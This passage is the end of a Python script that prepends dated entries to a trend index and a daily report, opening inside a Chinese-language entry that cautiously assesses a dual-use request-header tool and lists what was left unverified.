文件）形成整整一个档次的差距**；⭐⭐⭐⭐⭐ **⭐⭐ 但它能「改值并写回请求头」，双用途性质明确 —— 本日报记录它是因为形态与工程做法有价值，不是因为推荐在未评估的环境中使用**；⚠️ **未编译、未运行、未抓包；未核验 433 个 `.js` / 199 个 `.json` 的归属与授权状态；`crates/` 目录不存在（包在根目录），C ABI 布局未核验；「matching session」的判定机制未核验；0 release / 0 issue / 41⭐ 且发布仅 17 小时；组织名中的 "Botting" 与本档案所述用途无可核验技术关联，本日报不据此推断意图，但这是本数据集里第一个打破「可疑命名 ⇒ 空内容」相关性的样本**

---

"""

for rel, entry, anchor in [
    ("indexes/trend-index.md", TREND_ENTRY, "## 2026-11-08"),
    ("daily-report.md", REPORT_ENTRY, "## 2026-11-08"),
]:
    p = ROOT / rel
    c = p.read_text(encoding="utf-8")
    if "## 2026-11-13" in c.split("\n## ", 2)[1][:200]:
        print(f"{rel}: already has 2026-11-13 -- skipped")
        continue
    assert c.startswith(anchor), f"{rel}: does not start with {anchor!r}"
    p.write_text(entry + c, encoding="utf-8")
    print(f"{rel}: 2026-11-13 entry prepended ({len(entry)} bytes)")
